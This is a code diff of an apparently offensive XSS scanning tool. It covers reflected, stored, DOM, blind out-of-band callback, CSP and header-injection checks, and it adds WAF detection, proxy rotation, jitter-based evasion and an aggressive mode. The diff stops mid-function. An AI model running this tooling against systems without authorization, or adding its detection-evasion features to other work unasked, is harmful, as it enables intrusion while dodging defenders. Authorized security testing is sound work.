+                        details={"js_url": js_url, "source": src, "sink": sink,
+                                 "source_line": sp + 1, "sink_line": kp + 1,
+                                 "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3]},
                     ))
                     matched = True
                     break
                 if matched:
                     break
-
     return findings
 
 
-def run_dom_analysis(session: Session, outdir: Path) -> list[XSSFinding]:
+def run_dom_analysis(session: EvasionSession, outdir: Path) -> list[XSSFinding]:
     findings: list[XSSFinding] = []
     js_urls: list[str] = []
-
     for name in ("urls_js_files.txt", "js_files.txt"):
         p = outdir / name
         if p.exists():
@@ -1552,12 +1637,9 @@ def run_dom_analysis(session: Session, outdir: Path) -> list[XSSFinding]:
                         break
         if len(js_urls) >= MAX_DOM_FILES:
             break
-
     if not js_urls:
         return findings
-
     log.info(f"    DOM analysis: {len(js_urls)} JS file(s)")
-
     for js_url in js_urls:
         resp = session.get(js_url, timeout=15)
         time.sleep(REQUEST_SLEEP)
@@ -1567,28 +1649,23 @@ def run_dom_analysis(session: Session, outdir: Path) -> list[XSSFinding]:
         if not content:
             continue
         findings.extend(analyze_dom_js(js_url, content, js_url))
-
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 6 — STORED CANDIDATES
+#  STORED CANDIDATES
 # ═════════════════════════════════════════════════════════════════════════════
 
-def run_stored_candidates(
-    session: Session, surface: dict, baseline: Baseline,
-) -> list[XSSFinding]:
+def run_stored_candidates(session: EvasionSession, surface: dict,
+                          baseline: Baseline) -> list[XSSFinding]:
     findings: list[XSSFinding] = []
     marker = _new_marker()
-
     resp = _probe(session, surface, marker)
     time.sleep(REQUEST_SLEEP)
     if resp is None:
         return findings
-
     parsed = urllib.parse.urlparse(surface["url"])
     base = f"{parsed.scheme}://{parsed.netloc}"
-
     for path in STORED_REVISIT_PATTERNS[:MAX_STORED_PAGES]:
         test_url = base + path
         r = session.get(test_url)
@@ -1603,163 +1680,102 @@ def run_stored_candidates(
                 target=test_url, param=surface["param"],
                 param_location=surface["location"],
                 xss_type="stored", context=context,
-                severity="CRITICAL", confidence=80, confirmed=True,
+                severity=Severity.CRITICAL, confidence=80, confirmed=True,
                 payload=marker, marker=marker,
-                evidence=(
-                    f"Injected marker reappeared on {test_url} "
-                    f"after submission via {surface['param']}"
-                ),
-                details={
-                    "injection_url": surface["url"],
-                    "revisit_url": test_url,
-                    "context": context,
-                    "body_snippet": body[max(0, idx - 80): idx + 120],
-                },
+                evidence=(f"Injected marker reappeared on {test_url} "
+                          f"after submission via {surface['param']}"),
+                details={"injection_url": surface["url"], "revisit_url": test_url,
+                         "context": context,
+                         "body_snippet": body[max(0, idx - 80): idx + 120]},
             ))
             return findings
-
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 7 — BLIND OOB (HUGINN-AWARE)
+#  BLIND OOB
 # ═════════════════════════════════════════════════════════════════════════════
 
-def generate_blind_payloads(
-    surface: dict, *, oob_base_url: str, oob_mode: str = "path",
-) -> list[dict]:
-    """
-    Generate blind-XSS payloads with a Huginn-compatible 32-hex token.
-    Returns [] if OOB is not configured.
-    """
+def generate_blind_payloads(surface: dict, *, oob_base_url: str,
+                            oob_mode: str = "path") -> list[dict]:
     if not oob_base_url:
         return []
-
     token = _new_huginn_token()
-    client = HuginnClient(oob_base_url, verify_tls=False)  # OOB is user infra
-    if oob_mode == "subdomain":
-        oob_url = client.payload_url_subdomain(token)
-    else:
-        oob_url = client.payload_url_path(token)
-
+    client = HuginnClient(oob_base_url, verify_tls=False)
+    oob_url = (client.payload_url_subdomain(token) if oob_mode == "subdomain"
+               else client.payload_url_path(token))
     out: list[dict] = []
     for label, tmpl in BLIND_PAYLOAD_TEMPLATES:
         out.append({
-            "target":     surface["url"],
-            "param":      surface["param"],
-            "location":   surface["location"],
-            "oob_token":  token,
-            "oob_url":    oob_url,
-            "variant":    label,
-            "payload":    tmpl.format(oob=oob_url),
+            "target": surface["url"], "param": surface["param"],
+            "location": surface["location"],
+            "oob_token": token, "oob_url": oob_url,
+            "variant": label, "payload": tmpl.format(oob=oob_url),
         })
     return out
 
 
 def blind_payloads_to_findings(blind_payloads: list[dict]) -> list[XSSFinding]:
-    """Turn blind payloads into candidate findings so they land in findings[]."""
     by_token: dict[str, XSSFinding] = {}
     for b in blind_payloads:
         tok = b["oob_token"]
         if tok in by_token:
             continue
         by_token[tok] = XSSFinding(
-            target=b["target"],
-            param=b["param"],
+            target=b["target"], param=b["param"],
             param_location=b.get("location", "query"),
-            xss_type="blind",
-            context="(oob)",
-            severity="HIGH",
-            confidence=60,       # upgraded to 99 on confirmation
-            confirmed=False,
-            payload=b["payload"],
-            marker=tok,
-            evidence=(
-                f"Blind payload generated with OOB token {tok[:12]}… — "
-                "awaiting callback. Deploy and run --verify-oob."
-            ),
-            details={
-                "oob_url":    b["oob_url"],
-                "oob_token":  tok,
-                "variant":    b["variant"],
-                "deployed":   False,
-            },
+            xss_type="blind", context="(oob)",
+            severity=Severity.HIGH, confidence=60, confirmed=False,
+            payload=b["payload"], marker=tok,
+            evidence=(f"Blind payload generated with OOB token {tok[:12]}… — "
+                      "awaiting callback. Deploy and run --verify-oob."),
+            details={"oob_url": b["oob_url"], "oob_token": tok,
+                     "variant": b["variant"], "deployed": False},
         )
     return list(by_token.values())
 
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 7b — OOB VERIFICATION
-# ═════════════════════════════════════════════════════════════════════════════
-
-def verify_blind_findings(
-    outdir: Path, *,
-    oob_base_url: str,
-    read_key: Optional[str] = None,
-    max_wait: int = 0,
-    scan_id: Optional[int] = None,
-) -> dict:
-    """
-    Poll Huginn for each token in xss_blind.txt (or in findings[] of
-    xss_findings.json). Upgrade confirmed hits in place.
-
-    max_wait=0 → single pass (no waiting).
-    max_wait=N → poll each token for up to N seconds.
-
-    Returns {polled, confirmed, misses}.
-    """
+def verify_blind_findings(outdir: Path, *, oob_base_url: str,
+                          read_key: Optional[str] = None,
+                          max_wait: int = 0,
+                          scan_id: Optional[int] = None) -> dict:
     if not oob_base_url:
         return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no OOB base_url"}
-
     json_path = outdir / "xss_findings.json"
     if not json_path.exists():
         log.warning("  OOB verify: xss_findings.json missing — skipping")
         return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no report"}
-
     report = json.loads(json_path.read_text())
     findings = report.get("findings") or []
-
-    # Collect unique tokens from blind findings (not yet confirmed)
     tokens: dict[str, list[dict]] = {}
     for f in findings:
         if f.get("xss_type") != "blind":
             continue
-        if int(f.get("confirmed", 0)) == 1:
+        if f.get("confirmed") is True or f.get("confirmed") == 1:
             continue
         tok = (f.get("details") or {}).get("oob_token") or f.get("marker")
         if not tok or not re.fullmatch(r"[a-f0-9]{16,}", tok):
             continue
         tokens.setdefault(tok, []).append(f)
-
     if not tokens:
         log.info("  OOB verify: no unconfirmed blind findings to poll")
         return {"polled": 0, "confirmed": 0, "misses": 0}
-
-    log.info(
-        f"  OOB verify: polling {len(tokens)} token(s) against {oob_base_url}"
-        + (f" up to {max_wait}s each" if max_wait else " (single pass)")
-    )
-
+    log.info(f"  OOB verify: polling {len(tokens)} token(s) against {oob_base_url}"
+             + (f" up to {max_wait}s each" if max_wait else " (single pass)"))
     client = HuginnClient(oob_base_url, read_key=read_key, verify_tls=False)
     hits: dict[str, dict] = {}
     misses = 0
-
     for tok in tokens:
-        if max_wait > 0:
-            result = client.poll_until_hit(tok, max_wait=max_wait)
-        else:
-            result = client.check_token(tok)
+        result = (client.poll_until_hit(tok, max_wait=max_wait) if max_wait > 0
+                  else client.check_token(tok))
         if result.get("found"):
             hits[tok] = result
-            n_entries = len(result.get("entries") or [])
-            log.info(f"    ✔ {tok[:16]}…  {n_entries} callback(s)")
+            log.info(f"    ✔ {tok[:16]}…  {len(result.get('entries') or [])} callback(s)")
         else:
             misses += 1
-
     if not hits:
         log.info(f"    no callbacks yet — {misses} miss(es)")
         return {"polled": len(tokens), "confirmed": 0, "misses": misses}
-
     upgraded: list[dict] = []
     for f in findings:
         if f.get("xss_type") != "blind":
@@ -1771,48 +1787,44 @@ def verify_blind_findings(
         ip = entries[0].get("ip") if entries else "?"
         ts = entries[0].get("time") if entries else "?"
         ua = (entries[0].get("user_agent") or "?")[:60] if entries else "?"
-        f["confirmed"]  = 1
-        f["severity"]   = "CRITICAL"
+        f["confirmed"] = True
+        f["severity"] = "CRITICAL"
         f["confidence"] = 99
-        f["evidence"]   = (
-            f"Blind XSS CONFIRMED via OOB callback — {len(entries)} hit(s); "
-            f"first from IP {ip} at {ts} (UA: {ua})"
-        )
+        f["evidence"] = (f"Blind XSS CONFIRMED via OOB callback — {len(entries)} hit(s); "
+                         f"first from IP {ip} at {ts} (UA: {ua})")
         f.setdefault("details", {})["oob_confirmed"] = {
-            "token":   tok,
-            "entries": entries,
-            "hit_count": len(entries),
+            "token": tok, "entries": entries, "hit_count": len(entries),
         }
+        f.setdefault("chain_ids", []).append("xss-blind")
         upgraded.append(f)
-
     if upgraded:
         report["findings"] = findings
         totals = report.setdefault("totals", {})
         totals["confirmed"] = int(totals.get("confirmed", 0)) + len(upgraded)
         totals["blind_confirmed"] = len(upgraded)
-        json_path.write_text(
-            json.dumps(report, indent=2, ensure_ascii=False) + "\n"
-        )
+        json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
         log.info(f"    upgraded {len(upgraded)} blind finding(s) → CONFIRMED")
-
         if scan_id is not None:
             rebuilt = [_dict_to_finding(raw) for raw in upgraded]
             _self_sync(scan_id, rebuilt)
-
     return {"polled": len(tokens), "confirmed": len(upgraded), "misses": misses}
 
 
 def _dict_to_finding(raw: dict) -> XSSFinding:
-    """Inverse of XSSFinding.to_dict() — for re-syncing upgraded rows."""
+    sev_raw = raw.get("severity", "MEDIUM")
+    try:
+        sev = Severity(sev_raw) if not isinstance(sev_raw, Severity) else sev_raw
+    except ValueError:
+        sev = Severity.MEDIUM
     return XSSFinding(
         target=raw.get("target", ""),
         param=raw.get("param_name", ""),
         param_location=raw.get("param_location", "query"),
         xss_type=raw.get("xss_type", "blind"),
         context=raw.get("context", ""),
-        severity=raw.get("severity", "MEDIUM"),
+        severity=sev,
         confidence=int(raw.get("confidence", 0) or 0),
-        confirmed=bool(int(raw.get("confirmed", 0) or 0)),
+        confirmed=bool(raw.get("confirmed", False) is True or int(raw.get("confirmed", 0) or 0) == 1),
         payload=raw.get("payload", ""),
         marker=raw.get("marker", ""),
         evidence=raw.get("evidence", ""),
@@ -1820,44 +1832,41 @@ def _dict_to_finding(raw: dict) -> XSSFinding:
         encoded_chars=raw.get("encoded_chars") or [],
         survived_chars=raw.get("survived_chars") or [],
         http_status=int(raw.get("http_status", 0) or 0),
-        auth_enabled=bool(int(raw.get("auth_enabled", 0) or 0)),
+        chain_ids=raw.get("chain_ids") or [],
+        waf_vendor=raw.get("waf_vendor", ""),
+        auth_enabled=bool(raw.get("auth_enabled", False)),
         first_seen=raw.get("first_seen", ""),
         details=raw.get("details") or {},
     )
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 9 — CSP ANALYSIS
+#  CSP ANALYSIS
 # ═════════════════════════════════════════════════════════════════════════════
 
 def analyze_csp(resp: requests.Response, target: str) -> list[XSSFinding]:
     findings: list[XSSFinding] = []
     if resp is None:
         return findings
-
     csp = resp.headers.get("Content-Security-Policy", "")
     csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")
-
     if not csp and csp_ro:
         findings.append(XSSFinding(
             target=target, param="(CSP)", xss_type="csp", context="csp",
-            severity="INFO", confidence=90, confirmed=True,
+            severity=Severity.INFO, confidence=90, confirmed=True,
             payload="", evidence="Only Report-Only CSP present — directives are NOT enforced",
             details={"header": "Content-Security-Policy-Report-Only",
                      "value": csp_ro[:500]},
         ))
         return findings
-
     if not csp:
         return findings
-
     lower = csp.lower()
-
     checks = [
-        ("unsafe-inline", "HIGH",  "CSP allows 'unsafe-inline' — inline scripts execute"),
-        ("unsafe-eval",   "HIGH",  "CSP allows 'unsafe-eval' — eval() and Function() execute"),
-        ("script-src *",  "HIGH",  "script-src allows wildcard — any host can serve scripts"),
-        ("script-src: *", "HIGH",  "script-src allows wildcard — any host can serve scripts"),
+        ("unsafe-inline", Severity.HIGH, "CSP allows 'unsafe-inline' — inline scripts execute"),
+        ("unsafe-eval", Severity.HIGH, "CSP allows 'unsafe-eval' — eval() and Function() execute"),
+        ("script-src *", Severity.HIGH, "script-src allows wildcard — any host can serve scripts"),
+        ("script-src: *", Severity.HIGH, "script-src allows wildcard — any host can serve scripts"),
     ]
     for needle, sev, ev in checks:
         if needle in lower:
@@ -1867,40 +1876,35 @@ def analyze_csp(resp: requests.Response, target: str) -> list[XSSFinding]:
                 payload=needle, evidence=ev,
                 details={"header": "Content-Security-Policy", "directive": needle},
             ))
-
     for host in CSP_BYPASS_HOSTS:
         if host in csp:
             findings.append(XSSFinding(
                 target=target, param="(CSP)", xss_type="csp", context="csp",
-                severity="MEDIUM", confidence=70, confirmed=False,
+                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                 payload=f"script-src {host}",
                 evidence=f"script-src allowlists {host} — JSONP endpoints bypass CSP",
                 details={"header": "Content-Security-Policy",
                          "allowlisted_host": host},
             ))
-
     for missing in ("base-uri", "object-src"):
         if missing not in lower:
             findings.append(XSSFinding(
                 target=target, param="(CSP)", xss_type="csp", context="csp",
-                severity="MEDIUM", confidence=70, confirmed=False,
+                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                 payload=f"missing {missing}",
-                evidence=(
-                    f"CSP does not set {missing} — "
-                    + ("<base> tag injection redirects relative scripts" if missing == "base-uri"
-                       else "plugin-based script execution possible")
-                ),
+                evidence=(f"CSP does not set {missing} — "
+                          + ("<base> tag injection redirects relative scripts" if missing == "base-uri"
+                             else "plugin-based script execution possible")),
                 details={"header": "Content-Security-Policy", "directive": missing},
             ))
-
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 10 — HEADER REFLECTION (opt-in)
+#  HEADER REFLECTION (opt-in)
 # ═════════════════════════════════════════════════════════════════════════════
 
-def test_header_injection(session: Session, host_url: str) -> list[XSSFinding]:
+def test_header_injection(session: EvasionSession, host_url: str) -> list[XSSFinding]:
     findings: list[XSSFinding] = []
     for header in HEADER_INJECTION_VECTORS:
         marker = _new_marker()
@@ -1920,14 +1924,12 @@ def test_header_injection(session: Session, host_url: str) -> list[XSSFinding]:
             target=host_url, param=f"(header:{header})",
             param_location="header",
             xss_type="header", context=context,
-            severity="HIGH", confidence=75, confirmed=True,
+            severity=Severity.HIGH, confidence=75, confirmed=True,
             payload=payload, marker=marker,
             evidence=f"Header '{header}' reflected in {context} context",
             http_status=resp.status_code,
-            details={
-                "header": header, "context": context,
-                "body_snippet": body[max(0, idx - 80): idx + 120],
-            },
+            details={"header": header, "context": context,
+                     "body_snippet": body[max(0, idx - 80): idx + 120]},
         ))
         return findings
     return findings
@@ -1938,21 +1940,18 @@ def test_header_injection(session: Session, host_url: str) -> list[XSSFinding]:
 # ═════════════════════════════════════════════════════════════════════════════
 
 def audit_surface(
-    session: Session, surface: dict, *,
+    session: EvasionSession, surface: dict, *,
     test_stored: bool = True,
     oob_settings: Optional[dict] = None,
+    aggressive: bool = False,
+    waf_vendor: str = "",
 ) -> tuple[Baseline, list[XSSFinding], Optional[dict]]:
     baseline = build_baseline(session, surface)
-
-    # Content-type gate — skip probing binaries.
     if baseline.content_type and not _is_executable_content_type(baseline.content_type):
         return baseline, [], None
 
     reflection = probe_reflection(session, surface)
     if not reflection["reflected"]:
-        # JSONP test even without reflection — the callback check is different.
-        if oob_settings and oob_settings["mode"] != "disabled":
-            pass  # JSONP is not blind — handled below regardless
         jsonp = test_jsonp_injection(session, surface, baseline)
         if jsonp:
             return baseline, jsonp, None
@@ -1967,26 +1966,55 @@ def audit_surface(
     idx = body.find(marker)
     context = classify_context(body, idx) if idx >= 0 else "unknown"
 
-    findings = test_context_payloads(session, surface, baseline, context)
+    findings = test_context_payloads(
+        session, surface, baseline, context,
+        aggressive=aggressive, waf_vendor=waf_vendor,
+    )
     findings.extend(test_jsonp_injection(session, surface, baseline))
-
     if test_stored:
         findings.extend(run_stored_candidates(session, surface, baseline))
 
     blind_payloads: list[dict] = []
     if oob_settings and oob_settings["mode"] != "disabled":
         blind_payloads = generate_blind_payloads(
-            surface,
-            oob_base_url=oob_settings["base_url"],
+            surface, oob_base_url=oob_settings["base_url"],
             oob_mode=oob_settings["mode"],
         )
 
     return baseline, findings, {
-        "marker": marker,
-        "context": context,
+        "marker": marker, "context": context,
         "unencoded": reflection["unencoded"],
         "blind_payloads": blind_payloads,
     }
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  EVIDENCE PRESERVATION
+# ═════════════════════════════════════════════════════════════════════════════
+
+def _save_evidence(finding: XSSFinding, baseline_body: str, evidence_dir: Path) -> None:
+    try:
+        evidence_dir.mkdir(parents=True, exist_ok=True)
+        base = finding.finding_hash[:16]
+        (evidence_dir / f"{base}_evidence.txt").write_text(
+            f"finding_hash: {finding.finding_hash}\n"
+            f"target: {finding.target}\n"
+            f"param: {finding.param} ({finding.param_location})\n"
+            f"xss_type: {finding.xss_type}\n"
+            f"context: {finding.context}\n"
+            f"severity: {finding.severity.value}\n"
+            f"confidence: {finding.confidence}\n"
+            f"confirmed: {finding.confirmed}\n"
+            f"payload: {finding.payload}\n"
+            f"evidence: {finding.evidence}\n"
+            f"survived_chars: {finding.survived_chars}\n"
+            f"encoded_chars: {finding.encoded_chars}\n"
+            f"details: {json.dumps(finding.details, indent=2)}\n"
+        )
+        if baseline_body:
+            (evidence_dir / f"{base}_baseline.html").write_text(baseline_body[:50000])
+    except Exception as e:
+        log.debug(f"evidence save failed: {e}")
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -2010,10 +2038,7 @@ def _self_sync(scan_id: int, findings: list[XSSFinding]) -> None:
         return
     upsert = getattr(DB, "upsert_xss_findings", None)
     if upsert is None:
-        log.error(
-            "  DB sync: db.py is missing upsert_xss_findings(scan_id, rows). "
-            "Add the method to sync findings into xss_findings."
-        )
+        log.error("  DB sync: db.py is missing upsert_xss_findings(scan_id, rows)")
         return
     try:
         payloads = [f.to_dict() for f in findings]
@@ -2040,42 +2065,44 @@ def run_xss_scan(
     test_stored: bool = True,
     test_dom: bool = True,
     test_headers: bool = False,
+    aggressive: bool = False,
     max_surfaces: Optional[int] = None,
     rate_limit: Optional[int] = None,
     concurrency: Optional[int] = None,
     timeout: Optional[int] = None,
+    proxies: Optional[list[str]] = None,
     scan_id: Optional[int] = None,
     oob_poll_wait: int = 0,
 ) -> Path:
     start = time.monotonic()
-
     settings = _xss_settings()
     eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
     eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
     eff_timeout = timeout if timeout is not None else settings["timeout"]
     eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
+    eff_jitter  = settings["jitter"]
+    eff_proxies = proxies if proxies is not None else list(settings["proxies"])
     verify_tls  = settings["verify_tls"]
 
-    # Resolve OOB — explicit kwargs beat config.
     oob = _oob_settings()
     if oob_domain:
         base = oob_domain if oob_domain.startswith(("http://", "https://")) \
                else f"https://{oob_domain}"
         oob["base_url"] = base.rstrip("/")
-        oob["domain"]   = urllib.parse.urlparse(base).hostname or oob_domain
-        oob["mode"]     = oob_mode or "huginn"
+        oob["domain"] = urllib.parse.urlparse(base).hostname or oob_domain
+        oob["mode"] = oob_mode or "huginn"
     if oob_mode:
         oob["mode"] = oob_mode
 
     urls = _load_urls(urls_file)
     if not urls:
         log.warning(f"  No URLs in {urls_file} — writing empty report")
-        return _write_empty_report(outdir, urls_file, start)
+        return _write_empty(outdir, urls_file, start)
     if len(urls) > MAX_URLS:
         log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
         urls = urls[:MAX_URLS]
-
     outdir.mkdir(parents=True, exist_ok=True)
+    evidence_dir = outdir / "xss_evidence"
 
     cfg_hdrs = _target_headers()
     if headers:
@@ -2096,112 +2123,140 @@ def run_xss_scan(
 
     log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
     log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
-    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  "
-             f"timeout={eff_timeout}s  tls_verify={verify_tls}")
+    log.info(f"  Config : rate={eff_rate}/s  jitter={eff_jitter}s  "
+             f"concurrency={eff_conc}  timeout={eff_timeout}s  tls_verify={verify_tls}")
+    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
     log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
+    if eff_proxies:
+        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
     log.info(f"  Modes  : stored={test_stored}  dom={test_dom}  "
              f"headers={test_headers}  oob={oob['mode']}")
     if oob["base_url"]:
-        log.info(f"  OOB    : {oob['base_url']}  "
-                 f"(mode={oob['mode']}, poll_wait={oob_poll_wait}s)")
+        log.info(f"  OOB    : {oob['base_url']} (mode={oob['mode']}, "
+                 f"poll_wait={oob_poll_wait}s)")
     log.info("")
 
-    limiter = SharedRateLimiter(eff_rate)
-    session = Session(limiter, cfg_hdrs, eff_timeout, verify_tls=verify_tls)
-
+    profile = EvasionProfile(
+        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
+    )
     all_findings: list[XSSFinding] = []
     blind_payloads: list[dict] = []
     results: list[dict] = []
+    baseline_by_hash: dict[str, str] = {}
     waf_seen: dict[str, int] = {}
 
-    def _process(surface: dict) -> tuple[dict, list[XSSFinding], Optional[dict]]:
-        try:
-            baseline, findings, reflection = audit_surface(
-                session, surface,
-                test_stored=test_stored,
-                oob_settings=oob,
-            )
-            if baseline.waf:
-                waf_seen[baseline.waf] = waf_seen.get(baseline.waf, 0) + 1
-            return {
-                "url": surface["url"], "param": surface["param"],
-                "location": surface["location"],
-                "method": surface.get("method", "GET"),
-                "baseline": baseline.to_dict(),
-                "reflection": reflection,
-                "finding_count": len(findings),
-            }, findings, reflection
-        except Exception as e:
-            log.debug(f"    error on {_redact_url(surface['url'])}: {e}")
-            return {"url": surface["url"], "param": surface["param"],
-                    "location": surface["location"],
-                    "error": f"{type(e).__name__}: {e}"}, [], None
-
-    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
-    interrupted = False
-    try:
-        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
-            futures = {pool.submit(_process, s): s for s in surfaces}
-            done = 0
-            for fut in as_completed(futures):
-                done += 1
-                try:
-                    result, findings, reflection = fut.result()
-                    results.append(result)
-                    all_findings.extend(findings)
-                    if reflection:
-                        blind_payloads.extend(reflection.get("blind_payloads", []))
-                    if findings:
-                        top = findings[0]
-                        log.info(
-                            f"    [{done:>3}/{len(surfaces)}] {top.xss_type:<10} "
-                            f"{top.severity:<8} {top.context:<20} "
-                            f"{_redact_url(result['url'], 40)} param={result['param']}"
-                        )
-                    elif done % 20 == 0:
-                        log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
-                except Exception as e:
-                    log.debug(f"    future error: {type(e).__name__}: {e}")
-    except KeyboardInterrupt:
-        interrupted = True
-        log.warning("  interrupted — writing partial results")
-
-    # ── Blind findings as first-class candidates
-    all_findings.extend(blind_payloads_to_findings(blind_payloads))
-
-    if test_dom:
-        log.info("")
-        log.info("  DOM XSS static analysis...")
-        dom_findings = run_dom_analysis(session, outdir)
-        all_findings.extend(dom_findings)
-        log.info(f"    {len(dom_findings)} DOM finding(s)")
-
-    log.info("")
-    log.info("  CSP analysis...")
-    csp_seen: set[str] = set()
-    for s in surfaces[:50]:
-        host = urllib.parse.urlparse(s["url"]).hostname or ""
-        if host in csp_seen:
-            continue
-        csp_seen.add(host)
-        resp = session.get(s["url"], timeout=8)
-        if resp:
-            all_findings.extend(analyze_csp(resp, s["url"]))
-    log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'csp')} CSP finding(s)")
-
-    if test_headers:
-        log.info("")
-        log.info("  Header reflection test...")
-        header_seen: set[str] = set()
+    with EvasionSession(profile=profile, headers=cfg_hdrs,
+                        timeout=eff_timeout, verify_tls=verify_tls) as session:
+        # Phase 0 — WAF detection
+        log.info("  Phase 0 — WAF detection")
+        waf_by_host: dict[str, WAFReport] = {}
+        seen_hosts: set[str] = set()
         for s in surfaces[:50]:
             host = urllib.parse.urlparse(s["url"]).hostname or ""
-            if host in header_seen:
+            if not host or host in seen_hosts:
                 continue
-            header_seen.add(host)
-            all_findings.extend(test_header_injection(session, s["url"]))
-        log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'header')} header finding(s)")
+            seen_hosts.add(host)
+            waf = detect_waf(session, s["url"])
+            waf_by_host[host] = waf
+            if waf.vendor != "unknown":
+                log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")
 
-    # ── Dedupe (highest-confidence wins)
+        if any(w.vendor != "unknown" for w in waf_by_host.values()):
+            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
+            session.profile.jitter = max(eff_jitter, 0.8)
+
+        def _process(surface: dict) -> tuple[dict, list[XSSFinding], Optional[dict]]:
+            try:
+                host = urllib.parse.urlparse(surface["url"]).hostname or ""
+                waf = waf_by_host.get(host, WAFReport())
+                baseline, findings, reflection = audit_surface(
+                    session, surface,
+                    test_stored=test_stored,
+                    oob_settings=oob,
+                    aggressive=aggressive,
+                    waf_vendor=waf.vendor,
+                )
+                if baseline.waf:
+                    waf_seen[baseline.waf] = waf_seen.get(baseline.waf, 0) + 1
+                return {
+                    "url": surface["url"], "param": surface["param"],
+                    "location": surface["location"],
+                    "method": surface.get("method", "GET"),
+                    "baseline": baseline.to_dict(),
+                    "reflection": reflection,
+                    "finding_count": len(findings),
+                }, findings, reflection
+            except Exception as e:
+                log.debug(f"    error on {_redact_url(surface['url'])}: {e}")
+                return {"url": surface["url"], "param": surface["param"],
+                        "location": surface["location"],
+                        "error": f"{type(e).__name__}: {e}"}, [], None
+
+        log.info("")
+        log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
+        interrupted = False
+        try:
+            with ThreadPoolExecutor(max_workers=eff_conc) as pool:
+                futures = {pool.submit(_process, s): s for s in surfaces}
+                done = 0
+                for fut in as_completed(futures):
+                    done += 1
+                    try:
+                        result, findings, reflection = fut.result()
+                        results.append(result)
+                        all_findings.extend(findings)
+                        if reflection:
+                            blind_payloads.extend(reflection.get("blind_payloads", []))
+                        if findings:
+                            top = findings[0]
+                            log.info(
+                                f"    [{done:>3}/{len(surfaces)}] {top.xss_type:<10} "
+                                f"{top.severity.value:<8} {top.context:<20} "
+                                f"{_redact_url(result['url'], 40)} param={result['param']}"
+                            )
+                        elif done % 20 == 0:
+                            log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
+                    except Exception as e:
+                        log.debug(f"    future error: {type(e).__name__}: {e}")
+        except KeyboardInterrupt:
+            interrupted = True
+            log.warning("  interrupted — writing partial results")
+
+        all_findings.extend(blind_payloads_to_findings(blind_payloads))
+
+        if test_dom:
+            log.info("")
+            log.info("  DOM XSS static analysis...")
+            dom_findings = run_dom_analysis(session, outdir)
+            all_findings.extend(dom_findings)
+            log.info(f"    {len(dom_findings)} DOM finding(s)")
+
+        log.info("")
+        log.info("  CSP analysis...")
+        csp_seen: set[str] = set()
+        for s in surfaces[:50]:
+            host = urllib.parse.urlparse(s["url"]).hostname or ""
+            if host in csp_seen:
+                continue
+            csp_seen.add(host)
+            resp = session.get(s["url"], timeout=8)
+            if resp:
+                all_findings.extend(analyze_csp(resp, s["url"]))
+        log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'csp')} CSP finding(s)")
+
+        if test_headers:
+            log.info("")
+            log.info("  Header reflection test...")
+            header_seen: set[str] = set()
+            for s in surfaces[:50]:
+                host = urllib.parse.urlparse(s["url"]).hostname or ""
+                if host in header_seen:
+                    continue
+                header_seen.add(host)
+                all_findings.extend(test_header_injection(session, s["url"]))
+            log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'header')} header finding(s)")
+
+    # Dedupe
     seen_f: dict[str, XSSFinding] = {}
     for f in all_findings:
         h = f.finding_hash
@@ -2209,33 +2264,38 @@ def run_xss_scan(
         if existing is None or (f.confirmed, f.confidence) > (existing.confirmed, existing.confidence):
             seen_f[h] = f
     deduped = list(seen_f.values())
+
+    # Chains
+    log.info("")
+    log.info("  Chain aggregation")
+    chains = build_chains(deduped)
+    log.info(f"    {len(chains)} chain(s)")
+
     for f in deduped:
         f.auth_enabled = auth_on
         if not f.first_seen:
             f.first_seen = _db_now()
 
-    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
-    deduped.sort(key=lambda f: (
-        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
-        -f.confidence, f.target,
-    ))
+    deduped.sort(key=lambda f: (-f.severity.rank, 0 if f.confirmed else 1,
+                                -f.confidence, f.target))
 
     elapsed = time.monotonic() - start
-    by_severity = {k: 0 for k in SEV_ORDER}
+    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
     by_type: dict[str, int] = {}
     by_context: dict[str, int] = {}
     confirmed_list = [f for f in deduped if f.confirmed]
-
     for f in deduped:
-        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
+        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
         by_type[f.xss_type] = by_type.get(f.xss_type, 0) + 1
         if f.context:
             by_context[f.context] = by_context.get(f.context, 0) + 1
+        if f.confirmed:
